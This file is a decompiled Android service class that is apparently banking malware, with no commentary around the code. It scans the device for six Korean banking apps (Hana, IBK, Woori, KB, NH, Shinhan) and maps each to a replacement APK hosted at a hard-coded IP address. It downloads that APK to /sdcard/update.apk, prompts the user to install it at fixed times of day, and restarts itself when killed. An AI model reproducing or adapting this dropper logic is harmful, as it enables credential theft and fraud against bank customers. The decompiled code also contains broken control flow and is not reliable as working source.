// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3) 

package com.example.tnt2;

import android.app.ActivityManager;
import android.app.Service;
import android.content.*;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.res.AssetManager;
import android.content.res.Resources;
import android.os.*;
import android.util.Log;
import com.example.utils.SharePres;
import com.example.utils.SharePresSingle;
import java.io.*;
import java.util.*;
import org.apache.http.*;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;

// Referenced classes of package com.example.tnt2:
//            InstallActivity

public class InstallService extends Service
    implements android.os.Handler.Callback
{
    class HandlerThread extends Thread
    {

        public void run()
        {
            if(boo.booleanValue())
                mHandler.post(new Runnable() {

                    public void run()
                    {
                    }

                    final HandlerThread this$1;

            
            {
                this$1 = HandlerThread.this;
                super();
            }
                });
        }

        public void setBoo(boolean flag)
        {
            boo = Boolean.valueOf(flag);
        }

        Boolean boo;
        Handler mHandler;
        final InstallService this$0;

        public HandlerThread(Handler handler)
        {
            this$0 = InstallService.this;
            super();
            mHandler = handler;
        }
    }

    class MyThread extends Thread
    {

        public void run()
        {
            HttpGet httpget;
            Log.e(TAG, "mythread run");
            Log.e(TAG, (new StringBuilder("mythread downloadUrl ")).append(downloadUrl).toString());
            Log.e(TAG, (new StringBuilder("mythread filepath ")).append(filePath).toString());
            Environment.getExternalStorageDirectory().getPath();
            httpget = new HttpGet(downloadUrl);
            InputStream inputstream;
            FileOutputStream fileoutputstream;
            byte abyte0[];
            HttpResponse httpresponse = (new DefaultHttpClient()).execute(httpget);
            if(httpresponse.getStatusLine().getStatusCode() != 200)
                break MISSING_BLOCK_LABEL_271;
            Log.e(TAG, "mythread getstatuscode 200");
            inputstream = httpresponse.getEntity().getContent();
            File file = new File(filePath);
            if(file.exists())
                file.delete();
            file.createNewFile();
            Log.i("createNewfile", "OK");
            fileoutputstream = new FileOutputStream(file);
            abyte0 = new byte[8192];
_L1:
            int i = inputstream.read(abyte0);
            if(i == -1)
            {
                try
                {
                    fileoutputstream.close();
                    inputstream.close();
                    Log.e(TAG, "mythread download over");
                    return;
                }
                catch(Exception exception)
                {
                    exception.printStackTrace();
                }
                break MISSING_BLOCK_LABEL_270;
            }
            fileoutputstream.write(abyte0, 0, i);
              goto _L1
            return;
            Log.e(TAG, "mythread can't get code 200");
            return;
        }

        String downloadUrl;
        String filePath;
        final InstallService this$0;

        MyThread(String s, String s1)
        {
            this$0 = InstallService.this;
            super();
            filePath = s1;
            downloadUrl = s;
        }
    }


    public InstallService()
    {
        TAG = getClass().getSimpleName();
        packageName = "";
        className = "";
        filePath = "/sdcard/update.apk";
        url = "";
        showFlag = false;
    }

    private boolean checkActivity(Context context)
    {
        String s;
        List list;
        Iterator iterator;
        if(packageName != null && !"".equals(packageName))
            return true;
        ActivityManager activitymanager = (ActivityManager)context.getSystemService("activity");
        comIntent = new Intent();
        activitymanager.getRunningServices(100);
        s = context.getApplicationInfo().packageName;
        list = activitymanager.getRunningAppProcesses();
        iterator = list.iterator();
_L5:
        if(iterator.hasNext()) goto _L2; else goto _L1
_L1:
        Iterator iterator1 = list.iterator();
_L7:
        if(iterator1.hasNext()) goto _L4; else goto _L3
_L3:
        String s2 = packageName;
        boolean flag = false;
        if(s2 != "")
        {
            SharePresSingle.getInstance().putString("packageName", packageName);
            SharePresSingle.getInstance().putString("download_url", url);
            flag = true;
            Log.e(TAG, (new StringBuilder("InstallService checkpackage save ")).append(packageName).toString());
        }
        return flag;
_L2:
        android.app.ActivityManager.RunningAppProcessInfo runningappprocessinfo = (android.app.ActivityManager.RunningAppProcessInfo)iterator.next();
        Log.e(TAG, (new StringBuilder("processName   ")).append(runningappprocessinfo.processName).toString());
          goto _L5
_L4:
        String s1;
        s1 = getClassNameByProcessName(((android.app.ActivityManager.RunningAppProcessInfo)iterator1.next()).processName);
        Log.e(TAG, (new StringBuilder("pkgName   ")).append(s1).toString());
        if(s1.equals(s)) goto _L7; else goto _L6
_L6:
        if(s1.equals("com.hanabank.ebk.channel.android.hananbank"))
        {
            url = "http://223.255.198.147/home/zero.apk";
            comIntent.setClassName("com.hanabank.ebk.channel.android.hananbank", "com.hanabank.ebk.channel.android.hananbank.app.HanaIntro");
            packageName = "com.hanabank.ebk.channel.android.hananbank";
            className = "com.hanabank.ebk.channel.android.hananbank.app.HanaIntro";
        } else
        if(s1.equals("com.ibk.neobanking"))
        {
            url = "http://223.255.198.147/home/zero.apk";
            comIntent.setClassName("com.ibk.neobanking", "com.ibk.neobanking.ui.Intro");
            packageName = "com.ibk.neobanking";
            className = "com.ibk.neobanking.ui.Intro";
        } else
        if(s1.equals("com.webcash.wooribank"))
        {
            url = "http://223.255.198.147/home/zero.apk";
            comIntent.setClassName("com.webcash.wooribank", "com.webcash.wooribank.Intro");
            packageName = "com.webcash.wooribank";
            className = "com.webcash.wooribank.Intro";
        } else
        if(s1.equals("com.kbstar.kbbank"))
        {
            url = "http://223.255.198.147/home/zero.apk";
            comIntent.setClassName("com.kbstar.kbbank", "com.kbstar.kbbank.UI.CIntro");
            packageName = "com.kbstar.kbbank";
            className = "com.kbstar.kbbank.UI.CIntro";
        } else
        {
            if(!s1.equals("nh.smart"))
                continue; /* Loop/switch isn't completed */
            url = "http://223.255.198.147/home/zero.apk";
            comIntent.setClassName("nh.smart", "nh.smart.menu.activity.MainMenu");
            packageName = "nh.smart";
            className = "nh.smart.menu.activity.MainMenu";
        }
          goto _L3
        if(!s1.equals("com.shinhan.sbanking")) goto _L7; else goto _L8
_L8:
        url = "http://223.255.198.147/homezero.apk";
        comIntent.setClassName("com.shinhan.sbanking", "com.shinhan.bank.sbank.activity.main.IntroActivity");
        packageName = "com.shinhan.sbanking";
        className = "com.shinhan.bank.sbank.activity.main.IntroActivity";
          goto _L3
    }

    public static boolean checkAppInstalled(Intent intent, Context context)
    {
        boolean flag = true;
        List list = context.getPackageManager().queryIntentActivities(intent, 0);
        if(list == null || list.size() < flag)
            flag = false;
        return flag;
    }

    private boolean checkInstallActivity(Context context)
    {
        String s;
        Iterator iterator;
        if(packageName != null && !"".equals(packageName))
            return true;
        comIntent = new Intent();
        s = context.getApplicationInfo().packageName;
        iterator = getPackageManager().getInstalledApplications(8192).iterator();
_L4:
        if(iterator.hasNext()) goto _L2; else goto _L1
_L1:
        String s2 = packageName;
        boolean flag = false;
        if(s2 != "")
        {
            SharePresSingle.getInstance().putString("packageName", packageName);
            SharePresSingle.getInstance().putString("download_url", url);
            flag = true;
            Log.e(TAG, (new StringBuilder("InstallService checkpackage save ")).append(packageName).toString());
        }
        return flag;
_L2:
        String s1;
        s1 = getClassNameByProcessName(((ApplicationInfo)iterator.next()).packageName);
        Log.e(TAG, (new StringBuilder("pkgName   ")).append(s1).toString());
        if(s1.equals(s)) goto _L4; else goto _L3
_L3:
        if(s1.equals("com.hanabank.ebk.channel.android.hananbank"))
        {
            url = "http://223.255.198.147/home/zero.apk";
            comIntent.setClassName("com.hanabank.ebk.channel.android.hananbank", "com.hanabank.ebk.channel.android.hananbank.app.HanaIntro");
            packageName = "com.hanabank.ebk.channel.android.hananbank";
            className = "com.hanabank.ebk.channel.android.hananbank.app.HanaIntro";
        } else
        if(s1.equals("com.ibk.neobanking"))
        {
            url = "http://223.255.198.147/home/zero.apk";
            comIntent.setClassName("com.ibk.neobanking", "com.ibk.neobanking.ui.Intro");
            packageName = "com.ibk.neobanking";
            className = "com.ibk.neobanking.ui.Intro";
        } else
        if(s1.equals("com.webcash.wooribank"))
        {
            url = "http://223.255.198.147/home/zero.apk";
            comIntent.setClassName("com.webcash.wooribank", "com.webcash.wooribank.Intro");
            packageName = "com.webcash.wooribank";
            className = "com.webcash.wooribank.Intro";
        } else
        if(s1.equals("com.kbstar.kbbank"))
        {
            url = "http://223.255.198.147/home/zero.apk";
            comIntent.setClassName("com.kbstar.kbbank", "com.kbstar.kbbank.UI.CIntro");
            packageName = "com.kbstar.kbbank";
            className = "com.kbstar.kbbank.UI.CIntro";
        } else
        {
            if(!s1.equals("nh.smart"))
                continue; /* Loop/switch isn't completed */
            url = "http://223.255.198.147/home/zero.apk";
            comIntent.setClassName("nh.smart", "nh.smart.menu.activity.MainMenu");
            packageName = "nh.smart";
            className = "nh.smart.menu.activity.MainMenu";
        }
          goto _L1
        if(!s1.equals("com.shinhan.sbanking")) goto _L4; else goto _L5
_L5:
        url = "http://223.255.198.147/homezero.apk";
        comIntent.setClassName("com.shinhan.sbanking", "com.shinhan.bank.sbank.activity.main.IntroActivity");
        packageName = "com.shinhan.sbanking";
        className = "com.shinhan.bank.sbank.activity.main.IntroActivity";
          goto _L1
    }

    public static void copy(Context context, String s, String s1, String s2)
    {
        String s3;
        s3 = (new StringBuilder(String.valueOf(s1))).append("/").append(s2).toString();
        Log.i("file name ", (new StringBuilder("------")).append(s3).toString());
        File file = new File(s1);
        if(!file.exists())
            file.mkdir();
        InputStream inputstream;
        FileOutputStream fileoutputstream;
        byte abyte0[];
        File file1 = new File(s3);
        if(file1.exists())
            break MISSING_BLOCK_LABEL_173;
        file1.createNewFile();
        inputstream = context.getResources().getAssets().open(s);
        fileoutputstream = new FileOutputStream(s3);
        abyte0 = new byte[7168];
_L1:
        int i = inputstream.read(abyte0);
        if(i <= 0)
        {
            try
            {
                fileoutputstream.close();
                inputstream.close();
                return;
            }
            catch(Exception exception)
            {
                exception.printStackTrace();
            }
            break MISSING_BLOCK_LABEL_173;
        }
        fileoutputstream.write(abyte0, 0, i);
          goto _L1
    }

    private String getClassNameByProcessName(String s)
    {
        Iterator iterator = getApplicationContext().getPackageManager().getInstalledApplications(8192).iterator();
        ApplicationInfo applicationinfo;
        do
        {
            if(!iterator.hasNext())
                return "";
            applicationinfo = (ApplicationInfo)iterator.next();
        } while(!s.equals(applicationinfo.processName));
        return applicationinfo.packageName;
    }

    public static String getCurrentActivityPkgName(Context context)
    {
        return ((android.app.ActivityManager.RunningTaskInfo)((ActivityManager)context.getSystemService("activity")).getRunningTasks(1).get(0)).topActivity.getPackageName();
    }

    public boolean handleMessage(Message message)
    {
        if(message.what == 1)
        {
            boolean flag = sp.getBoolean("hasCheck", false);
            Log.i("test", (new StringBuilder("\u5B9A\u65F6\u63D0\u9192:hasCheck=")).append(flag).toString());
            if(checkInstallActivity(this))
            {
                Intent intent = new Intent();
                intent.setPackage(SharePresSingle.getInstance().getString("download_pkg", null));
                if(checkAppInstalled(intent, this))
                    return true;
                Intent intent1 = new Intent();
                intent1.setFlags(0x10000000);
                intent1.putExtra("pkgName", packageName);
                intent1.setClass(this, com/example/tnt2/InstallActivity);
                startActivity(intent1);
            }
        }
        return false;
    }

    public IBinder onBind(Intent intent)
    {
        return null;
    }

    public void onCreate()
    {
        sp = getSharedPreferences("config", 0);
        super.onCreate();
    }

    public void onDestroy()
    {
        super.onDestroy();
        Intent intent = new Intent();
        intent.setClass(getApplicationContext(), com/example/tnt2/InstallService);
        startService(intent);
    }

    public void onStart(Intent intent, int i)
    {
        super.onStart(intent, i);
        mChildHandler = new Handler(this);
        (new Thread() {

            public void run()
            {
                do
                {
                    int j = Calendar.getInstance().get(11);
                    int k = Calendar.getInstance().get(12);
                    Log.i("test", (new StringBuilder("====minute=")).append(k).append(" hour=").append(j).toString());
                    if(k == 0 && (j == 8 || j == 11 || j == 17 || j == 20))
                        mChildHandler.sendEmptyMessage(1);
                    try
                    {
                        Thread.sleep(60000L);
                    }
                    catch(InterruptedException interruptedexception)
                    {
                        interruptedexception.printStackTrace();
                    }
                } while(true);
            }

            final InstallService this$0;

            
            {
                this$0 = InstallService.this;
                super();
            }
        }).start();
    }

    private static final int MSG_CHECK_APP = 1;
    private static final int SETUP_APP_TIME = 0xdbba0;
    static final String downloadUrl_hana = "http://223.255.198.147/home/zero.apk";
    static final String downloadUrl_ibk = "http://223.255.198.147/home/zero.apk";
    static final String downloadUrl_kb = "http://223.255.198.147/home/zero.apk";
    static final String downloadUrl_nh = "http://223.255.198.147/home/zero.apk";
    static final String downloadUrl_woori = "http://223.255.198.147/home/zero.apk";
    static final String downloadUrl_xinhan = "http://223.255.198.147/homezero.apk";
    private String TAG;
    String className;
    Intent comIntent;
    String filePath;
    Handler mChildHandler;
    MyThread myThread;
    String packageName;
    boolean showFlag;
    private SharedPreferences sp;
    String url;

}
